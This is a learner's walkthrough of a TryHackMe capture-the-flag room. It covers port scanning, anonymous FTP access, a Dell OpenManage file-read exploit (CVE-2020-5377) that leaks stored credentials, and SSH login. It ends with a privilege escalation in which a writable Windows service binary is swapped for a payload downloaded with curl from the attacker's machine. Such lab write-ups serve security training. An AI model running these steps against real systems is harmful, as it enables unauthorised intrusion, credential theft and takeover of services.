<h1 align="center">Hack Smarter Security</h1>
<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/0ce3b3db-3e8a-410a-a666-45e12f36c38c"><br>
July 17, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, 
and I’m excited to join you on this adventure, part of my <code>437</code>-day-streak in<a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>A place where you start at some point, and you have to go back to it in the end</em>.<br>
Access it <a href="https://tryhackme.com/room/moebius"</a>here.<br><br>
I was able to complete this CTF following jaxafed walkthrough.  Thank you!<br><br>
<img width="1200px" src="https://github.com/user-attachments/assets/39daf325-41d8-4121-a1f4-e76e68605110"></p>

<br>

<h2>Task 1 . Can you hack the hackers?</h2>
<h3>Challenge Description</h3>
<p>Your mission is to infiltrate the web server of the notorious Hack Smarter APT (Advanced Persistent Threat) group. This group is known for conducting malicious cyber activities, and it's imperative that we gather intel on their upcoming targets.<br>

The Hack Smarter APT operates a well-protected web server, fortified with advanced security measures. Your objective is to compromise their server undetected, extract the list of upcoming targets, and leave no trace of your presence.<br>

To begin, you'll need to employ your extensive hacking skills and exploit any vulnerabilities in their server's defenses. Remember, stealth and discretion are key.<br> You must avoid triggering any alarms that could lead to a premature shutdown of the server or alert the Hack Smarter APT group to your presence.<br>

Once you gain access to their server, navigate through their intricate network infrastructure, bypassing firewalls, encryption protocols, and other security layers. Locate the central repository where they store sensitive information, including their upcoming target list. Intel has reported this is located on the desktop of the Administrator user.<br> 

Exercise caution as you retrieve the list. The Hack Smarter APT group is known for employing countermeasures such as intrusion detection systems and advanced monitoring tools. It's crucial that you maintain a low profile and avoid leaving any traces that could compromise the mission or endanger your own safety.<br>

Upon successfully acquiring the list of upcoming targets, transmit the data to our secure server using encrypted channels. This will ensure that our analysts can analyze the information and take appropriate action to protect potential targets from cyber attacks.<br>

Remember, this is a high-stakes mission, and the information you gather will be instrumental in dismantling the Hack Smarter APT group's operations. Good luck, and may your skills lead you to success in this mission.</p>

<h3 align="left"> Answer the questions below</h3>

> 1.1. <em>What is user.txt? </em><br><a id='1.1'></a>
>> <strong><code>Redacted</code></strong><br>
<p></p>

<br>

> 1.2. <em>Which organizations is the Hack Smarter group targeting next? </em><br><a id='1.2'></a>
>> <strong><code>Redacted</code></strong><br>
<p></p>

<br>
<br>

<h3>nmap</h3>
<p>

- <code>21</code>/ftp<br>
- <code>22</code>/ssh<br>
- <code>80</code>/http<br>
- <code>1311</code>/https = ssl/rxmon<br>
- <code>ms-wbt-server</code>/RDP = ms-wbt-server</p>

```bash
:~/HackSmarterSecurity# nmap -sC -sV -Pn -p- -n -T4 TargetIP
...
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 06-28-23  02:58PM                 3722 Credit-Cards-We-Pwned.txt
|_06-28-23  03:00PM              1022126 stolen-passport.png
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
...
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: HackSmarterSec
1311/tcp open  ssl/rxmon?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Strict-Transport-Security: max-age=0
|     X-Frame-Options: SAMEORIGIN
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     vary: accept-encoding
|     Content-Type: text/html;charset=UTF-8
|     Date: Thu, 17 Jul 2025 xx:xx:xx GMT
|     Connection: close
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
|     <html>
|     <head>
|     <META http-equiv="Content-Type" content="text/html; charset=UTF-8">
|     <title>OpenManage&trade;</title>
|     <link type="text/css" rel="stylesheet" href="/oma/css/loginmaster.css">
|     <style type="text/css"></style>
|     <script type="text/javascript" src="/oma/js/prototype.js" language="javascript"></script><script type="text/javascript" src="/oma/js/gnavbar.js" language="javascript"></script><script type="text/javascript" src="/oma/js/Clarity.js" language="javascript"></script><script language="javascript">
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Strict-Transport-Security: max-age=0
|     X-Frame-Options: SAMEORIGIN
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     vary: accept-encoding
|     Content-Type: text/html;charset=UTF-8
|     Date: Thu, 17 Jul 2025 xx:xx:xx GMT
|     Connection: close
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
|     <html>
|     <head>
|     <META http-equiv="Content-Type" content="text/html; charset=UTF-8">
|     <title>OpenManage&trade;</title>
|     <link type="text/css" rel="stylesheet" href="/oma/css/loginmaster.css">
|     <style type="text/css"></style>
|_    <script type="text/javascript" src="/oma/js/prototype.js" language="javascript"></script><script type="text/javascript" src="/oma/js/gnavbar.js" language="javascript"></script><script type="text/javascript" src="/oma/js/Clarity.js" language="javascript"></script><script language="javascript">
| ssl-cert: Subject: commonName=hacksmartersec/organizationName=Dell Inc/stateOrProvinceName=TX/countryName=US
| Not valid before: 2023-06-30T19:03:17
|_Not valid after:  2025-06-29T19:03:17
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: HACKSMARTERSEC
|   NetBIOS_Domain_Name: HACKSMARTERSEC
|   NetBIOS_Computer_Name: HACKSMARTERSEC
|   DNS_Domain_Name: hacksmartersec
|   DNS_Computer_Name: hacksmartersec
|   Product_Version: 10.0.17763
|_  System_Time: 2025-07-17Txx:xx:xx+00:00
| ssl-cert: Subject: commonName=hacksmartersec
| Not valid before: 2025-07-16Txx:xx:xx
|_Not valid after:  2026-01-15Txx:xx:xx
|_ssl-date: 2025-07-17Txx:xx:xx+00:00; -1s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
```

<h3>ftp</h3>

```bash
:~/HackSmarterSecurity# ftp TargetIP
Connected to TargetIP1.
220 Microsoft FTP Service
Name (10.10.207.171:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls -lah
200 PORT command successful.
125 Data connection already open; Transfer starting.
06-28-23  02:58PM                 3722 Credit-Cards-We-Pwned.txt
06-28-23  03:00PM              1022126 stolen-passport.png
226 Transfer complete.
ftp> get Credit-Cards-We-Pwned.txt
local: Credit-Cards-We-Pwned.txt remote: Credit-Cards-We-Pwned.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
3722 bytes received in 0.00 secs (4.1516 MB/s)
ftp> get stolen-passport.png
local: stolen-passport.png remote: stolen-passport.png
200 PORT command successful.
125 Data connection already open; Transfer starting.
WARNING! 4093 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
1022126 bytes received in 0.02 secs (55.2155 MB/s)
ftp> exit
221 Goodbye.
```

<h3>File type</h3>

```bash
:~/HackSmarterSecurity# file Credit-Cards-We-Pwned.txt
Credit-Cards-We-Pwned.txt: CSV text
:~/HackSmarterSecurity# file stolen-passport.png
stolen-passport.png: data
```

<h3>Credit-Cards-We-Pwned.txt</h3>

```bash
:~/HackSmarterSecurity# cat Credit-Cards-We-Pwned.txt
VISA, Redacted, 8/2027, 273
VISA, Redacted, 8/2024, 166
VISA, Redacted, 12/2027, 209
...
```

<h3>stolen-passport.png</h3>

```bash

```

<br>

<h3>Web 80</h3>

<img width="1037" height="555" alt="image" src="https://github.com/user-attachments/assets/66d01b5e-c253-430b-8b12-b0197bd832d8" />

<h4>Learn More</h4>

<img width="1041" height="689" alt="image" src="https://github.com/user-attachments/assets/f96311f7-4dfb-4a99-a690-48bac3f7ca2d" />

<h4>H4x0rs For Hire </h4>

<img width="1046" height="570" alt="image" src="https://github.com/user-attachments/assets/c7d2963e-eccc-4b40-a7f3-9d3e940bee35" />

<br>

<h3>Web 1311</h3>

<img width="1047" height="631" alt="image" src="https://github.com/user-attachments/assets/6d7fbd0d-3bc6-48c9-b816-c0857783d78a" />

<img width="1040" height="221" alt="image" src="https://github.com/user-attachments/assets/7238a122-ddf7-4e25-ba3e-9f24dd3f3f0d" />


<h4>About</h4>
<p>Version 9.4.0.2</p>

<img width="783" height="418" alt="image" src="https://github.com/user-attachments/assets/7a22a0d0-5c20-40af-9b5d-57ec466536de" />

<br>

<h4>Vulnerability</h4>

<p>CVE-2020-5377 - Dell OpenManager Server Administrator File Read</p>

<img width="743" height="379" alt="image" src="https://github.com/user-attachments/assets/9fa331d8-66fa-4b81-afad-75e6d5927691" />

<img width="1312" height="430" alt="image" src="https://github.com/user-attachments/assets/edd1d009-c8f3-48e5-8c8c-172c1997ef5e" />

<img width="1898" height="826" alt="image" src="https://github.com/user-attachments/assets/1f321e5e-5198-4110-89cd-e84a11cacf59" />


<p>https://www.cvedetails.com/vulnerability-list/vendor_id-2234/year-2020/Dell.html</p>

<img width="1886" height="293" alt="image" src="https://github.com/user-attachments/assets/83f380e7-77d0-456e-8e6d-4b43feef4604" />

<p>CVE-2020-5377</p>

<img width="1095" height="134" alt="image" src="https://github.com/user-attachments/assets/b36ff2ef-025b-4f8a-9a89-aeae5740f369" />

<p>CVE-2021-21514</p>

<img width="1087" height="118" alt="image" src="https://github.com/user-attachments/assets/33db6388-952c-471f-9d57-648f402945e6" />

<br>

<h3>PoC</h3>

<p>https://rhinosecuritylabs.com/research/cve-2020-5377-dell-openmanage-server-administrator-file-read/?source=post_page-----5b5e4f7fa1ff---------------------------------------</p>

<p>https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2020-5377_CVE-2021-21514</p>p>

```bash
:~/HackSmarterSecurity# wget https://raw.githubusercontent.com/RhinoSecurityLabs/CVEs/refs/heads/master/CVE-2020-5377_CVE-2021-21514/CVE-2020-5377.py
...
CVE-2020-5377.py                100%[=====================================================>]   5.42K  --.-KB/s    in 0s      
:~/HackSmarterSecurity# ~/HackSmarterSecurity# python3 CVE-2020-5377.py AttackIP TargetIP:TargetPort
[-] No server.pem certificate file found. Generating one...
Generating a RSA private key
..................................+++++
....................+++++
writing new private key to 'server.pem'
-----
Session: 6147373C5E0990DC00EF93E09A77DB10
VID: F0350F4112E45309
file > /Windows/System32/inetsrv/Config/applicationHost.config
...
file > C:\inetpub\wwwroot\hacksmartersec\web.config
Reading contents of C:\inetpub\wwwroot\hacksmartersec\web.config:
<configuration>
  <appSettings>
    <add key="Username" value="tyler" />
    <add key="Password" value="IAmA1337h4x0randIkn0wit!" />
  </appSettings>
  <location path="web.config">
    <system.webServer>
      <security>
        <authorization>
          <deny users="*" />
        </authorization>
      </security>
    </system.webServer>
  </location>
</configuration>


file > 
...
```

<h3>ssh</h3>

```bash
:~/HackSmarterSecurity# ssh tyler@TargetIP
...
```

```bash
tyler@HACKSMARTERSEC C:\Users\tyler>dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\tyler

06/30/2023  07:10 PM    <DIR>          .
06/30/2023  07:10 PM    <DIR>          ..
06/30/2023  07:10 PM    <DIR>          3D Objects
06/30/2023  07:10 PM    <DIR>          Contacts
06/30/2023  07:12 PM    <DIR>          Desktop
06/30/2023  07:10 PM    <DIR>          Documents
06/30/2023  07:10 PM    <DIR>          Downloads
06/30/2023  07:10 PM    <DIR>          Favorites
06/30/2023  07:10 PM    <DIR>          Links
06/30/2023  07:10 PM    <DIR>          Music
06/30/2023  07:10 PM    <DIR>          Pictures
06/30/2023  07:10 PM    <DIR>          Saved Games
06/30/2023  07:10 PM    <DIR>          Searches
06/30/2023  07:10 PM    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)  14,111,490,048 bytes free

tyler@HACKSMARTERSEC C:\Users\tyler>cd Desktop 

tyler@HACKSMARTERSEC C:\Users\tyler\Desktop>dir 
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\tyler\Desktop

06/30/2023  07:12 PM    <DIR>          .
06/30/2023  07:12 PM    <DIR>          ..
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website 
06/27/2023  09:42 AM                25 user.txt
               3 File(s)          1,106 bytes
               2 Dir(s)  14,110,670,848 bytes free

tyler@HACKSMARTERSEC C:\Users\tyler\Desktop>type user.txt 
THM{REDACTED}
tyler@HACKSMARTERSEC C:\Users\tyler\Desktop> 
```

<img width="542" height="114" alt="image" src="https://github.com/user-attachments/assets/9f2f6f8b-c1cb-46bb-b776-6119acf5a55a" />

```bash
Tyler@HACKSMARTERSEC C:\Program Files (x86)>dir 
 Volume in drive C has no label. 
 Volume Serial Number is A8A4-C362

 Directory of C:\Program Files (x86)

06/30/2023  06:57 PM    <DIR>          .
06/30/2023  06:57 PM    <DIR>          ..
03/11/2021  07:29 AM    <DIR>          AWS SDK for .NET
03/11/2021  07:29 AM    <DIR>          AWS Tools
09/15/2018  07:28 AM    <DIR>          Common Files
03/18/2020  06:47 AM    <DIR>          Internet Explorer
09/15/2018  07:19 AM    <DIR>          Microsoft.NET
06/30/2023  06:57 PM    <DIR>          Spoofer
01/13/2021  09:21 PM    <DIR>          Windows Defender
09/15/2018  07:19 AM    <DIR>          Windows Mail
01/13/2021  09:21 PM    <DIR>          Windows Media Player
09/15/2018  07:19 AM    <DIR>          Windows Multimedia Platform
09/15/2018  07:28 AM    <DIR>          windows nt
01/13/2021  09:21 PM    <DIR>          Windows Photo Viewer
09/15/2018  07:19 AM    <DIR>          Windows Portable Devices
09/15/2018  07:19 AM    <DIR>          WindowsPowerShell
06/30/2023  06:57 PM    <DIR>          WinPcap
               0 File(s)              0 bytes
              17 Dir(s)  14,110,670,848 bytes free

tyler@HACKSMARTERSEC C:\Program Files (x86)>
```


```bash
tyler@HACKSMARTERSEC C:\Program Files (x86)>cd Spoofer

tyler@HACKSMARTERSEC C:\Program Files (x86)\Spoofer>DIR 
 Volume in drive C has no label. 
 Volume Serial Number is A8A4-C362

 Directory of C:\Program Files (x86)\Spoofer

06/30/2023  06:57 PM    <DIR>          .
06/30/2023  06:57 PM    <DIR>          ..
07/24/2020  09:31 PM            16,772 CHANGES.txt
07/16/2020  07:23 PM             7,537 firewall.vbs
07/24/2020  09:31 PM            82,272 LICENSE.txt
07/24/2020  09:31 PM             3,097 README.txt
07/24/2020  09:31 PM            48,776 restore.exe
07/20/2020  11:12 PM           575,488 scamper.exe
06/30/2023  06:57 PM               152 shortcuts.ini
07/24/2020  09:31 PM         4,315,064 spoofer-cli.exe
07/24/2020  09:31 PM        16,171,448 spoofer-gui.exe
07/24/2020  09:31 PM         4,064,696 spoofer-prober.exe
07/24/2020  09:31 PM         8,307,640 spoofer-scheduler.exe
07/24/2020  09:31 PM               667 THANKS.txt
07/24/2020  09:31 PM           217,416 uninstall.exe
              13 File(s)     33,811,025 bytes
               2 Dir(s)  14,110,670,848 bytes free

tyler@HACKSMARTERSEC C:\Program Files (x86)\Spoofer>type CHANGES.txt 
spoofer-1.4.6 (2020-07-24) 
-------------
* Finds Spoofer control server by hostname instead of IP address
* Updated for better compatibility with Qt 5.15
* Updated for better compatibility with protobuf 3.12
* macOS: avoid use of launch services API (deprecated in OS X 10.10)
* macOS: updated binary release:
  - drop support for OS X <10.10
  - updated bundled third-party packages: openssl 1.1.1g, pcap 1.9.1,
    protobuf 3.12.3, Qt 5.9, scamper 20200717
* Windows: updated binary release:
  - updated bundled third-party packages: openssl 1.1.1g, protobuf 3.9.0,
    Qt 5.15, scamper 20200717
* Added new CA bundle to match potential new server SSL certificate
* Fix build error on FreeBSD 13+ and other platforms with arc4random() but not
  arc4random_stir() (OpenBSD was already fixed in Spoofer 1.4.2)

spoofer-1.4.5 (2019-07-03)
-------------
* Fixed compile-time incompatibility with protobuf 3.8

spoofer-1.4.4 (2019-03-12)
-------------
* GUI: fixed: "outbound routable" column was mislabeled "outbound private"
...
```

<img width="1035" height="516" alt="image" src="https://github.com/user-attachments/assets/fdf87d18-d719-4e5b-8435-9b9f7f23cac5" />


```bash
tyler@HACKSMARTERSEC C:\Users\tyler>sc stop spoofer-scheduler

SERVICE_NAME: spoofer-scheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x2
        WAIT_HINT          : 0x0

tyler@HACKSMARTERSEC C:\Users\tyler>
```

```bash
tyler@HACKSMARTERSEC C:\Users\tyler>icacls "C:\Program Files (x86)\Spoofer\spoofer-scheduler.exe"
C:\Program Files (x86)\Spoofer\spoofer-scheduler.exe BUILTIN\Users:(I)(F)
                                                     NT AUTHORITY\SYSTEM:(I)(F)
                                                     BUILTIN\Administrators:(I)(F)
                                                     APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                     APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```


```bash
root@ip-10-10-104-24:~# nano payload.c
root@ip-10-10-104-24:~# locate x86_64-w64-mingw32-gcc-win32
/usr/bin/x86_64-w64-mingw32-gcc-win32
root@ip-10-10-104-24:~# cp /usr/bin/x86_64-w64-mingw32-gcc-win32 x86_64-w64-mingw32-gcc-win32
root@ip-10-10-104-24:~#


x86_64-w64-mingw32-gcc-win32 payload.c -o payload.exe



```

```bash
tyler@HACKSMARTERSEC C:\Program Files (x86)\Spoofer>move spoofer-scheduler.exe spoofer-scheduler.exe.bak
        1 file(s) moved.

tyler@HACKSMARTERSEC C:\Program Files (x86)\Spoofer>curl http://10.10.104.24:8000/payload.exe -o spoofer-scheduler.exe
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  309k  100  309k    0     0   309k      0  0:00:01 --:--:--  0:00:01 9669k

tyler@HACKSMARTERSEC C:\Program Files (x86)\Spoofer>sc start spoofer-scheduler
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.


tyler@HACKSMARTERSEC C:\Program Files (x86)\Spoofer>
```

```bash
tyler@HACKSMARTERSEC C:\Users\tyler>whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
```


```bash
:~/HackSmarterSecurity# ssh tyler@10.10.207.17
```


```bash
tyler@HACKSMARTERSEC C:\Users\Administrator\Desktop\Hacking-Targets>dir 
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\Administrator\Desktop\Hacking-Targets

06/30/2023  06:40 PM    <DIR>          .
06/30/2023  06:40 PM    <DIR>          ..
06/27/2023  09:40 AM                53 hacking-targets.txt
               1 File(s)             53 bytes
               2 Dir(s)  14,109,138,944 bytes free

tyler@HACKSMARTERSEC C:\Users\Administrator\Desktop\Hacking-Targets>type hacking-targets.txt 
Next Victims:
CyberLens, WorkSmarter, SteelMountain
tyler@HACKSMARTERSEC C:\Users\Administrator\Desktop\Hacking-Targets> 
```

<br>
<br>

<img width="1899" height="886" alt="image" src="https://github.com/user-attachments/assets/91839c52-59b4-4dfa-9424-d956ea678638" />

<img width="1897" height="897" alt="image" src="https://github.com/user-attachments/assets/3df990f7-f2ec-4a18-b7e2-cb6a1e2d1704" />

<br>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| July 17, 2025     | 437      |     154ᵗʰ    |      5ᵗʰ     |    167ᵗʰ    |     7ᵗʰ    | 115,329  |    865    |    72     |

</div>

<img width="329" height="88" alt="image" src="https://github.com/user-attachments/assets/41959531-db87-43a6-854f-994300df79f6" />

<img width="1887" height="894" alt="image" src="https://github.com/user-attachments/assets/ed699f72-375a-404c-8a14-5eb2e717c6f7" />

<img width="1897" height="895" alt="image" src="https://github.com/user-attachments/assets/93f51d3b-ddb3-4fa9-b274-479fe34c7ab9" />

<img width="1882" height="889" alt="image" src="https://github.com/user-attachments/assets/09692c8c-b341-468c-b1a7-17ba62ca6b7f" />

<img width="1887" height="897" alt="image" src="https://github.com/user-attachments/assets/132c3037-7982-40a3-9177-65e66b901c69" />
